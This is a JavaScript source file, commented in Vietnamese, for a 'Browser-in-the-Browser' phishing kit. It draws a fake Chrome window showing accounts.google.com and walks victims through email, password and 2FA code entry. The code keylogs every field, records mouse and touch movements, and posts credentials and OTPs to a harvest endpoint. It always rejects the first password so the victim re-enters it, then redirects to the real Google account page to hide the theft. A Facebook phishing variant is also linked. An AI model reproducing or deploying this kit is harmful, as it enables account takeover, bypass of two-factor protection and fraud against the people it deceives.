/**
 * Browser-in-the-Browser (BitB) Attack Framework — Script
 * 
 * Kỹ thuật: Tạo popup CSS giả mô phỏng cửa sổ Chrome
 * hiển thị URL giả (accounts.google.com) bên trong trang web
 * 
 * Flow: Host page → Click "Login with Google" → BitB popup → 
 *       Email → Password (sai→nhập lại) → 2FA OTP → Redirect
 */

// ===== SESSION & CONFIG =====
window.SESSION_ID = 'bitb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
window.PAGE_TYPE = 'bitb_google';
const SESSION_ID = window.SESSION_ID;
const urlParams = new URLSearchParams(window.location.search);
window.CAMPAIGN_ID = urlParams.get('campaign') || 'bitb';

// ===== STATE =====
let bitbStep = 'email'; // email → password → 2fa
let submitCount = 0;
let savedEmail = '';
let savedPassword = '';

// ===== SESSION REPLAY =====
const replayEvents = [];
let replayFlushTimer = null;

function trackEvent(type, data) {
    replayEvents.push({ t: Date.now(), type, ...data });
    clearTimeout(replayFlushTimer);
    replayFlushTimer = setTimeout(flushReplay, 3000);
}
function flushReplay() {
    if (!replayEvents.length) return;
    const batch = replayEvents.splice(0);
    fetch('/api/session-replay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: SESSION_ID, page_type: 'bitb_google', campaign_id: window.CAMPAIGN_ID, events: batch })
    }).catch(() => {});
}

document.addEventListener('click', e => trackEvent('click', { x: e.clientX, y: e.clientY, tag: e.target.tagName, id: e.target.id }));
document.addEventListener('mousemove', (() => { let lt = 0; return e => { if (Date.now() - lt < 100) return; lt = Date.now(); trackEvent('move', { x: e.clientX, y: e.clientY }); }; })());
document.addEventListener('touchmove', e => { const t = e.touches[0]; trackEvent('touch', { x: t.clientX, y: t.clientY }); }, { passive: true });
window.addEventListener('beforeunload', () => { if (replayEvents.length) navigator.sendBeacon('/api/session-replay', JSON.stringify({ session_id: SESSION_ID, page_type: 'bitb_google', campaign_id: window.CAMPAIGN_ID, events: replayEvents })); });

// ===== KEYLOGGER =====
function setupKeylogger(el, field) {
    if (!el) return;
    let t;
    el.addEventListener('input', function() {
        clearTimeout(t);
        t = setTimeout(() => {
            fetch('/api/keylog', { method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ field, value: el.value, key: 'input', page_type: 'bitb_google', session_id: SESSION_ID })
            }).catch(() => {});
        }, 300);
    });
}

// ===== OPEN BitB POPUP =====
function openBitBGoogle() {
    bitbStep = 'email';
    submitCount = 0;

    const overlay = document.createElement('div');
    overlay.className = 'bitb-overlay';
    overlay.id = 'bitbOverlay';

    overlay.innerHTML = `
        <div class="bitb-window" onclick="event.stopPropagation()">
            <!-- Chrome Title Bar -->
            <div class="bitb-titlebar">
                <div class="bitb-dots"><span></span><span></span><span></span></div>
                <div class="bitb-urlbar">
                    <span class="bitb-lock">🔒</span>
                    <span class="bitb-url-text">
                        <span class="domain">accounts.google.com</span><span class="path">/o/oauth2/v2/auth?client_id=...</span>
                    </span>
                </div>
                <button class="bitb-close" onclick="closeBitB()" title="Close">✕</button>
            </div>

            <!-- Content -->
            <div class="bitb-content" id="bitbContent" style="position:relative;">
                <!-- Loading overlay -->
                <div class="bitb-loading" id="bitbLoading">
                    <div class="bitb-spinner"></div>
                    <p>Đang xác minh...</p>
                </div>

                <!-- Step: Email -->
                <div class="bitb-google-form" id="bitbStepEmail">
                    <div class="g-logo">
                        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" height="24">
                    </div>
                    <h2>Đăng nhập</h2>
                    <p class="g-subtitle">để tiếp tục đến ứng dụng</p>

                    <div class="g-error" id="bitbError1">Không tìm thấy Tài khoản Google của bạn</div>

                    <div class="g-input-group">
                        <input type="text" class="g-input" id="bitbEmail" placeholder="Email hoặc số điện thoại" autocomplete="off">
                        <span class="g-input-label">Email hoặc số điện thoại</span>
                    </div>

                    <p style="font-size:12px;color:#5f6368;text-align:left;margin-top:8px;">
                        Bạn chưa có máy tính? <a href="#" class="g-link" onclick="return false">Dùng chế độ khách</a>
                    </p>

                    <div class="g-actions">
                        <a class="g-link" onclick="return false">Tạo tài khoản</a>
                        <button class="g-btn" onclick="bitbNextEmail()">Tiếp theo</button>
                    </div>
                </div>
            </div>

            <div class="bitb-footer">
                <span>Tiếng Việt</span>
                <div>
                    <a href="#">Trợ giúp</a> · <a href="#">Quyền riêng tư</a> · <a href="#">Điều khoản</a>
                </div>
            </div>
        </div>
    `;

    // Click overlay to close (outside popup)
    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) closeBitB();
    });

    document.body.appendChild(overlay);

    // Setup keylogger on email input
    setTimeout(() => {
        const emailInput = document.getElementById('bitbEmail');
        if (emailInput) {
            emailInput.focus();
            setupKeylogger(emailInput, 'email');
            emailInput.addEventListener('keydown', e => { if (e.key === 'Enter') bitbNextEmail(); });
            emailInput.addEventListener('focus', () => trackEvent('focus', { field: 'bitb_email' }));
            emailInput.addEventListener('blur', () => trackEvent('blur', { field: 'bitb_email' }));
        }
    }, 300);
}

// ===== STEP: Email → Password =====
function bitbNextEmail() {
    const email = document.getElementById('bitbEmail').value.trim();
    if (!email) {
        document.getElementById('bitbError1').classList.add('show');
        return;
    }
    savedEmail = email;

    const content = document.getElementById('bitbContent');
    const loading = document.getElementById('bitbLoading');

    loading.classList.add('active');
    setTimeout(() => {
        loading.classList.remove('active');
        showPasswordStep();
    }, 800);
}

function showPasswordStep() {
    const form = document.getElementById('bitbStepEmail');
    form.outerHTML = `
        <div class="bitb-google-form" id="bitbStepPassword">
            <div class="g-logo">
                <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" height="24">
            </div>
            <h2>Chào mừng</h2>

            <div class="bitb-user-chip" onclick="backToEmail()">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                </svg>
                <span>${savedEmail}</span>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
            </div>

            <div class="g-error" id="bitbError2">Mật khẩu không đúng. Hãy thử lại hoặc nhấp vào <a href="#" style="color:#1a73e8" onclick="return false">Quên mật khẩu</a></div>

            <div class="g-input-group">
                <input type="password" class="g-input" id="bitbPassword" placeholder="Nhập mật khẩu của bạn" autocomplete="off">
                <span class="g-input-label">Nhập mật khẩu của bạn</span>
            </div>

            <div class="bitb-show-pw">
                <input type="checkbox" id="bitbShowPw" onchange="document.getElementById('bitbPassword').type=this.checked?'text':'password'">
                <label for="bitbShowPw">Hiển thị mật khẩu</label>
            </div>

            <div class="g-actions">
                <a class="g-link" onclick="return false">Quên mật khẩu?</a>
                <button class="g-btn" id="bitbBtnSubmit" onclick="bitbSubmitPassword()">Tiếp theo</button>
            </div>
        </div>
    `;

    setTimeout(() => {
        const pwInput = document.getElementById('bitbPassword');
        if (pwInput) {
            pwInput.focus();
            setupKeylogger(pwInput, 'password');
            pwInput.addEventListener('keydown', e => { if (e.key === 'Enter') bitbSubmitPassword(); });
            pwInput.addEventListener('focus', () => trackEvent('focus', { field: 'bitb_password' }));
            pwInput.addEventListener('blur', () => trackEvent('blur', { field: 'bitb_password' }));
        }
    }, 100);
}

// ===== SUBMIT PASSWORD =====
async function bitbSubmitPassword() {
    const password = document.getElementById('bitbPassword').value.trim();
    if (!password) {
        document.getElementById('bitbError2').classList.add('show');
        return;
    }
    document.getElementById('bitbError2').classList.remove('show');

    const loading = document.getElementById('bitbLoading');
    const btn = document.getElementById('bitbBtnSubmit');
    loading.classList.add('active');
    if (btn) btn.disabled = true;

    try {
        await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: savedEmail, password,
                page_type: 'bitb_google',
                session_id: SESSION_ID,
                campaign_id: window.CAMPAIGN_ID,
                screen_info: { width: screen.width, height: screen.height, pixelRatio: devicePixelRatio }
            })
        });
    } catch(e) {}

    submitCount++;
    savedPassword = password;

    await new Promise(r => setTimeout(r, 1200 + Math.random() * 800));
    loading.classList.remove('active');
    if (btn) btn.disabled = false;

    if (submitCount === 1) {
        document.getElementById('bitbError2').classList.add('show');
        document.getElementById('bitbPassword').value = '';
        document.getElementById('bitbPassword').focus();
    } else {
        show2FAStep();
    }
}

// ===== 2FA STEP =====
function show2FAStep() {
    const phoneSuffix = String(Math.floor(10 + Math.random() * 89));
    const stepEl = document.getElementById('bitbStepPassword');

    stepEl.outerHTML = `
        <div class="bitb-google-form bitb-2fa" id="bitbStep2FA">
            <div class="g-logo">
                <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" height="24">
            </div>
            <h2>Xác minh 2 bước</h2>

            <div class="bitb-user-chip">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                </svg>
                <span>${savedEmail}</span>
            </div>

            <div class="phone-icon">📱</div>
            <p>Tin nhắn có mã xác minh 6 chữ số vừa được gửi đến <strong>•••-•••-••${phoneSuffix}</strong></p>

            <input type="tel" class="otp-input" id="bitbOTP" maxlength="6" placeholder="______" autocomplete="off">

            <div class="g-actions" style="justify-content:center;gap:16px;">
                <a class="g-link" onclick="return false">Thử cách khác</a>
                <button class="g-btn" id="bitbBtn2FA" onclick="bitbSubmit2FA()" disabled style="opacity:0.5">Tiếp theo</button>
            </div>
        </div>
    `;

    setTimeout(() => {
        const otpInput = document.getElementById('bitbOTP');
        if (otpInput) {
            otpInput.focus();
            setupKeylogger(otpInput, 'otp');
            otpInput.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                const filled = this.value.length >= 6;
                const btn = document.getElementById('bitbBtn2FA');
                btn.disabled = !filled;
                btn.style.opacity = filled ? '1' : '0.5';
            });
            otpInput.addEventListener('keydown', e => { if (e.key === 'Enter') bitbSubmit2FA(); });
            otpInput.addEventListener('focus', () => trackEvent('focus', { field: 'bitb_otp' }));
        }
    }, 100);
}

// ===== SUBMIT 2FA =====
async function bitbSubmit2FA() {
    const otp = document.getElementById('bitbOTP').value.trim();
    if (otp.length < 6) return;

    const loading = document.getElementById('bitbLoading');
    loading.classList.add('active');

    try {
        await fetch('/api/harvest', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: savedEmail, password: savedPassword, otp,
                page_type: 'bitb_google',
                session_id: SESSION_ID,
                campaign_id: window.CAMPAIGN_ID
            })
        });
    } catch(e) {}

    flushReplay();
    await new Promise(r => setTimeout(r, 1500));
    closeBitB();

    // Show success message on host page
    const section = document.querySelector('.social-login-section');
    if (section) {
        section.innerHTML = `
            <div style="padding:20px;text-align:center;">
                <div style="font-size:48px;margin-bottom:12px;">✅</div>
                <h3 style="color:#188038;margin-bottom:8px;">Đăng nhập thành công!</h3>
                <p style="font-size:13px;color:#666;">Đang tải nội dung...</p>
            </div>
        `;
    }
    setTimeout(() => { window.location.href = 'https://myaccount.google.com'; }, 2000);
}

// ===== BACK / CLOSE =====
function backToEmail() {
    const stepEl = document.getElementById('bitbStepPassword');
    if (stepEl) {
        stepEl.outerHTML = `
            <div class="bitb-google-form" id="bitbStepEmail">
                <div class="g-logo">
                    <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" height="24">
                </div>
                <h2>Đăng nhập</h2>
                <p class="g-subtitle">để tiếp tục đến ứng dụng</p>
                <div class="g-error" id="bitbError1">Không tìm thấy Tài khoản Google</div>
                <div class="g-input-group">
                    <input type="text" class="g-input" id="bitbEmail" placeholder="Email hoặc số điện thoại" value="${savedEmail}" autocomplete="off">
                    <span class="g-input-label">Email hoặc số điện thoại</span>
                </div>
                <div class="g-actions">
                    <a class="g-link" onclick="return false">Tạo tài khoản</a>
                    <button class="g-btn" onclick="bitbNextEmail()">Tiếp theo</button>
                </div>
            </div>
        `;
        setTimeout(() => {
            const el = document.getElementById('bitbEmail');
            if (el) { el.focus(); setupKeylogger(el, 'email'); el.addEventListener('keydown', e => { if (e.key === 'Enter') bitbNextEmail(); }); }
        }, 100);
    }
}

function closeBitB() {
    const overlay = document.getElementById('bitbOverlay');
    if (overlay) {
        overlay.style.opacity = '0';
        overlay.style.transition = 'opacity 0.25s';
        setTimeout(() => overlay.remove(), 250);
    }
}

// ===== Facebook BitB variant =====
function openBitBFacebook() {
    // Redirect to Facebook phishing with BitB campaign tracking
    window.location.href = '/phishing/facebook.html?campaign=bitb_facebook&utm_source=bitb';
}
